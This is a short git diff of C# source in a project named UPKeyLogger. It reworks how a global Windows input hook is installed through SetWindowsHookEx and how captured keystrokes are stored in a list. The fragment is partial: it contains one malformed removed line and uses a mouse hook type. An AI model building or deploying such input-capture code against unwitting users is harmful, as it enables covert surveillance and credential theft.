@@ -1,9 +1,5 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using System.Windows;
 using System.Runtime.InteropServices;
 using System.Reflection;
 using System.IO;
@@ -27,8 +23,6 @@ namespace UPKeyLogger
 
         //Declare MouseHookProcedure as a HookProc type.
         private static HookProc MouseHookProcedure;
-
-        private static StreamWriter writer;
 
         //Declare the wrapper managed POINT class.
         [StructLayout(LayoutKind.Sequential)]
@@ -97,7 +91,7 @@ namespace UPKeyLogger
         {
             if (hHook == 0)
             {
-                writer = new StreamWriter();stre
+                keyStrokes = new LinkedList<String>();
                 // Create an instance of HookProc.
                 MouseHookProcedure = new HookProc(MouseHookProc);
                 hHook = SetWindowsHookEx(14,
@@ -107,6 +101,7 @@ namespace UPKeyLogger
                 //If the SetWindowsHookEx function fails.
                 if (hHook == 0)
                 {
+                    Console.Write(Marshal.GetLastWin32Error());
                     return;
                 }
                 //button1.Text = "UnHook Windows Hook";
